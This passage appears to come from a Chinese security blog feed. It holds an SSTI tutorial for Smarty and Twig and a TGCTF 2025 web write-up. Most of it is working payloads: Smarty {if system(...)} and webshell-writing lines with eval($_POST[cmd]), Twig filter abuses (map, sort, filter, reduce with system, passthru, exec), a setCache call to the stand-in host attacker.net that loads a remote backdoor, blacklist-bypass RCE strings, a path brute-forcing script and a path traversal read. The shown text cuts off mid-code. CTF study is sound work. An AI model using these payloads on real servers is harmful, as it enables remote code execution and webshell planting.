<p>此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，</code>我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>标签中间的内容就会被原封不动的输出，并不会解析。</p>
<p>作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</p>
<p>所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。</p>
<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>

<p><strong>{php}{&#x2F;php}</strong></p>
<p>用于执行php代码</p>
<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>

<p>但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。</p>
<p><strong>{if}{&#x2F;if}</strong></p>
<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
<span class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span>
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</code></pre>

<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h4 id="语法结构-1"><a href="#语法结构-1" class="headerlink" title="语法结构"></a>语法结构</h4><p>有两种形式的分隔符：<code>&#123;% ... %&#125;</code> 和 <code>&#123;&#123; ... &#125;&#125;</code>。前者用于执行语句，例如 <code>for</code> 循环，后者用于将表达式的结果输出到模板中。</p>
<p>应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 <code>.</code> 来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），也可以使用所谓的 “subscript” 语法 <code>[]</code>:</p>
<pre><code class="highlight plaintext">&#123;&#123; foo.bar &#125;&#125;
&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</code></pre>

<p><strong>设置变量</strong></p>
<p>为模块代码内变量赋值时使用<code>set</code>标签</p>
<pre><code class="highlight plaintext">&#123;% set foo = &#x27;foo&#x27; %&#125;
&#123;% set foo = [1, 2] %&#125;
&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</code></pre>

<p><strong>过滤器</strong></p>
<p>twig还提供了过滤器来修改模板中的变量。在过滤器中，变量与一个或多个过滤器间使用|分隔，还可以在括号中加入可选参数。可以连接多个过滤器，一个过滤器的输出结果将用于下一个过滤器中。</p>
<p>下面这个过滤器的例子会剥去字符串变量 <code>name</code> 中的 HTML 标签，然后将其转化为大写字母开头的格式:</p>
<pre><code class="highlight plaintext">&#123;&#123; name|striptags|title &#125;&#125;

// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;
// Output: Whoami!</code></pre>

<p>下面这个过滤器将接收一个序列 <code>list</code>，然后使用 <code>join</code> 中指定的分隔符将序列中的项合并成一个字符串：</p>
<pre><code class="highlight plaintext">&#123;&#123; list|join &#125;&#125;
&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;
// Output: abc

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;
// Output: a|b|c</code></pre>

<p><strong>函数</strong></p>
<p>在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 <code>range()</code> 函数用来返回一个包含整数等差数列的列表：</p>
<pre><code class="highlight plaintext">&#123;% for i in range(0, 3) %&#125;
    &#123;&#123; i &#125;&#125;,
&#123;% endfor %&#125;

// Output: 0, 1, 2, 3,</code></pre>

<p><strong>引入其他模板</strong></p>
<p>Twig 提供的 <code>include</code> 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：</p>
<pre><code class="highlight plaintext">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</code></pre>

<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><h5 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h5><p>在 Twig 1.x 中存在三个全局变量：</p>
<ul>
<li><code>_self</code>：引用当前模板的实例。</li>
<li><code>_context</code>：引用当前上下文。</li>
<li><code>_charset</code>：引用当前字符集。</li>
</ul>
<p>对应的代码是：</p>
<pre><code class="highlight plaintext">protected $specialVars = [
        &#x27;_self&#x27; =&gt; &#x27;$this&#x27;,
        &#x27;_context&#x27; =&gt; &#x27;$context&#x27;,
        &#x27;_charset&#x27; =&gt; &#x27;$this-&gt;env-&gt;getCharset()&#x27;,
    ];</code></pre>

<p>这里主要就是利用 <code>_self</code> 变量，它会返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</code></pre>

<p>此外还有 <code>getFilter</code> 方法：</p>
<pre><code class="highlight plaintext">public function getFilter($name)
  &#123;
    ...
    foreach ($this-&gt;filterCallbacks as $callback) &#123;
    if (false !== $filter = call_user_func($callback, $name)) &#123;
      return $filter;
    &#125;
  &#125;
  return false;
&#125;

public function registerUndefinedFilterCallback($callable)
&#123;
  $this-&gt;filterCallbacks[] = $callable;
&#125;</code></pre>

<p>我们在 <code>getFilter</code> 里发现了危险函数 <code>call_user_func</code>。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>

<p>但是在 Twig 2.x 及 Twig 3.x 以后，<code>_self</code> 的作用发生了变化，只能返回当前实例名字符串：</p>
<h5 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h5><p>到了 Twig 2.x &#x2F; 3.x 版本中，<code>__self</code> 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p>
<p><strong>map</strong></p>
<p>进行一个映射关系</p>
<pre><code class="highlight plaintext">map 过滤器将箭头函数应用于序列或映射的元素。箭头函数接收序列或映射的值

&#123;% set people = [
    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,
    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,
] %&#125;

&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
箭头函数还将键作为第二个参数接收

&#123;% set people = &#123;
    &quot;Bob&quot;: &quot;Smith&quot;,
    &quot;Alice&quot;: &quot;Dupond&quot;,
&#125; %&#125;

&#123;&#123; people|map((value, key) =&gt; &quot;#&#123;key&#125; #&#123;value&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
请注意，箭头函数可以访问当前上下文。</code></pre>

<p>也就是说当我们使用<code>map</code>时</p>
<p><code>&#123;&#123;["Mark"]|map((arg)=>"Hello #&#123;arg&#125;!")&#125;&#125;</code>会被编译成<code>twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</code></p>
<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_map($array, $arrow)
&#123;
    $r = [];
    foreach ($array as $k =&gt; $v) &#123;
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    &#125;

    return $r;
&#125;</code></pre>

<p>从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>

<p>如果函数被禁止了也可以通过写马来进行RCE</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;phpinfo();&quot;]|map(&quot;assert&quot;)|join(&quot;,&quot;)&#125;&#125;
&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;    // 写 Webshell</code></pre>

<p><strong>sort</strong></p>
<p>这个 <code>sort</code> 筛选器可以用来对数组排序。</p>
<pre><code class="highlight plaintext">&#123;% for user in users|sort %&#125;
    ...
&#123;% endfor %&#125;</code></pre>

<p>可以传递一个箭头函数来配置排序</p>
<pre><code class="highlight plaintext">&#123;% set fruits = [
    &#123;name: &#x27;Apples&#x27;, quantity: 5&#125;,
    &#123;name: &#x27;Oranges&#x27;, quantity: 2&#125;,
    &#123;name: &#x27;Grapes&#x27;, quantity: 4&#125;,
] %&#125;

&#123;% for fruit in fruits|sort((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|column(&#x27;name&#x27;) %&#125;
    &#123;&#123; fruit &#125;&#125;
&#123;% endfor %&#125;

&#123;# output in this order: Oranges, Grapes, Apples #&#125;</code></pre>

<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_sort_filter</code> 函数，这个 <code>twig_sort_filter</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_sort_filter($array, $arrow = null)
&#123;
    if ($array instanceof \Traversable) &#123;
        $array = iterator_to_array($array);
    &#125; elseif (!\is_array($array)) &#123;
        throw new RuntimeError(sprintf(&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;, \gettype($array)));
    &#125;

    if (null !== $arrow) &#123;
        uasort($array, $arrow);    // 直接被 uasort 调用 
    &#125; else &#123;
        asort($array);
    &#125;

    return $array;
&#125;</code></pre>

<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>uasort</code> 函数调用。众所周知 <code>uasort</code> 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;,0];
php &gt; usort($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>

<p>知道了做这些我们便可以构造 Payload 了：</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>

<p><strong>filter</strong></p>
<p>这个 <code>filter</code> 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：</p>
<pre><code class="highlight plaintext">&#123;% set lists = [34, 36, 38, 40, 42] %&#125;
&#123;&#123; lists|filter(v =&gt; v &gt; 38)|join(&#x27;, &#x27;) &#125;&#125;

// Output: 40, 42</code></pre>

<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_filter</code> 函数，这个 <code>twig_array_filter</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_filter($array, $arrow)
&#123;
    if (\is_array($array)) &#123;
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    &#125;

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
&#125;</code></pre>

<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_filter</code> 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;];
php &gt; array_filter($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>

<pre><code class="highlight plaintext">poc:
&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>



<p><strong>reduce</strong></p>
<p>这个 <code>reduce</code> 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：</p>
<pre><code class="highlight plaintext">&#123;% set numbers = [1, 2, 3] %&#125;
&#123;&#123; numbers|reduce((carry, v) =&gt; carry + v) &#125;&#125;
// Output: 6</code></pre>

<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_reduce</code> 函数，这个 <code>twig_array_reduce</code> 函数的源码如下：</p>
<pre><code class="highlight plaintext">function twig_array_reduce($array, $arrow, $initial = null)
&#123;
    if (!\is_array($array)) &#123;
        $array = iterator_to_array($array);
    &#125;

    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
&#125;</code></pre>

<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_reduce</code> 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。</p>
<p>直接给出 Payload：</p>
<pre><code class="highlight plaintext">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;id&quot;)&#125;&#125;    // 无回显</code></pre>

]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF_Writeup</title>
    <url>/2025/04/18/TGCTF-Writeup/</url>
    <content><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>这比赛说他好吧，确实让我发现自己的知识点漏洞有多大(哈哈，还是过过的知识点，恨不得给自己一巴掌，差点就可以卷铺盖走人了)。说差，你吗的前端游戏我一直以为题目就是那个错误页面，第二天又开才发现是正常的前端游戏，构式靶机。。。还有一堆莫名其妙的脑洞和对电波环节，有点。。了吧</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平"></a><strong>AAA偷渡阴平</strong></h3><pre><code class="highlight php"> <span class="meta">&lt;?php</span>


<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];

<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>

<p>一眼无参RCE。。网上随便找个poc过了</p>
<pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre>

<h3 id="火眼辩魑魅"><a href="#火眼辩魑魅" class="headerlink" title="火眼辩魑魅"></a><strong>火眼辩魑魅</strong></h3><p>robots.txt </p>
<pre><code class="highlight plaintext">User-Agent: *
Disallow: tgupload.php
Disallow: tgshell.php
Disallow: tgxff.php
Disallow: tgser.php
Disallow: tgphp.php
Disallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre>

<p>我是唇笔所以净喜欢走弯路哈哈。。</p>
<p>明明题面已经说要看哪个了</p>
<p>稍微尝试了一下发现system,passthru这些基本都被ban了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p>
<pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre>

<p>但是赛后看官方WP看红温了哈哈，官方给的是tgxff.php然后用ssti打，说是其他能打出来就是非预期哦，鉴定为史</p>
<p>同时上面这个shell其实直接连都可以。。。算是绕弯了</p>
<h3 id="AAA偷渡阴平-复仇"><a href="#AAA偷渡阴平-复仇" class="headerlink" title="AAA偷渡阴平(复仇)"></a><strong>AAA偷渡阴平(复仇)</strong></h3><p>ban了无参RCE，但是一样打</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
</code></pre>

<p>poc:</p>
<pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));
PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre>

<h3 id="直面天命"><a href="#直面天命" class="headerlink" title="直面天命"></a><strong>直面天命</strong></h3><p>先看一眼源码</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p>
<p>换hint</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p>
<p>。。懒得喷，我直接pt买hint了哈哈</p>
<p>这里贴一下队里师傅的脚本</p>
<pre><code class="highlight py"><span class="keyword">import</span> requests
<span class="keyword">import</span> itertools
<span class="keyword">import</span> string
<span class="keyword">import</span> time
<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor

<span class="comment"># 目标网站的基础URL - 使用前请替换为实际目标URL</span>
BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># 请替换为实际目标URL</span>

<span class="comment"># 使用所有26个小写字母</span>
all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>

<span class="comment"># 定义测试单个路径的函数</span>


<span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):
    url = BASE_URL + path
    <span class="keyword">try</span>:
        response = requests.get(url, timeout=<span class="number">3</span>)

        <span class="comment"># 根据状态码和响应长度来判断是否找到有效页面</span>
        status = response.status_code
        length = <span class="built_in">len</span>(response.text)

        <span class="comment"># 记录所有非404响应</span>
        <span class="keyword">if</span> status != <span class="number">404</span>:
            <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现: <span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)&quot;</span>)

            <span class="comment"># 保存发现的路径到文件中</span>
            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:
                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (状态码: <span class="subst">&#123;status&#125;</span>, 长度: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)

            <span class="comment"># 如果是200状态码，保存响应内容以便检查</span>
            <span class="keyword">if</span> status == <span class="number">200</span>:
                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:
                    f.write(response.text)

    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
        <span class="keyword">pass</span>  <span class="comment"># 忽略连接错误，继续测试</span>

    <span class="keyword">return</span> path


<span class="comment"># 显示开始信息</span>
<span class="built_in">print</span>(<span class="string">&quot;[*] 开始爆破所有4字母路径...&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] 目标URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] 总组合数: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (这可能需要一些时间)&quot;</span>)

<span class="comment"># 跟踪进度变量</span>
total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># 可能的4字母组合总数</span>
completed = <span class="number">0</span>
start_time = time.time()

<span class="comment"># 使用多线程加速过程</span>
<span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:
    <span class="comment"># 生成并测试所有4字母组合</span>
    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):
        path = <span class="string">&#x27;&#x27;</span>.join(combo)
        executor.submit(test_path, path)

        <span class="comment"># 定期更新进度</span>
        completed += <span class="number">1</span>
        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:
            elapsed = time.time() - start_time
            percentage = (completed / total_combinations) * <span class="number">100</span>
            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
            remaining = (total_combinations - completed) / \
                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>

            <span class="built_in">print</span>(<span class="string">f&quot;[*] 进度: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>
                  <span class="string">f&quot;已用时间: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>秒 - 预计剩余: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>秒 - 速度: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>请求/秒&quot;</span>)

<span class="built_in">print</span>(<span class="string">&quot;[*] 爆破完成! 查看 &#x27;found_paths.txt&#x27; 获取结果。&quot;</span>)</code></pre>

<p><code>/aazz</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p>
<p>…参…数……?那我问你，参数名是什么，那我问你(也有可能是我没进群所以没看到类似通知的缘故)</p>
<p>反正后面知道是filename(赛后知道这个也是要fuzz出来的),看名字应该就是任意文件读取了</p>
<p>稍微试一下啊</p>
<p>预期应该是抓源码的，结果哈哈</p>
<pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre>

<p>贴一个源码吧</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></code></pre>



<h3 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a><strong>直面天命（复仇）</strong></h3><pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

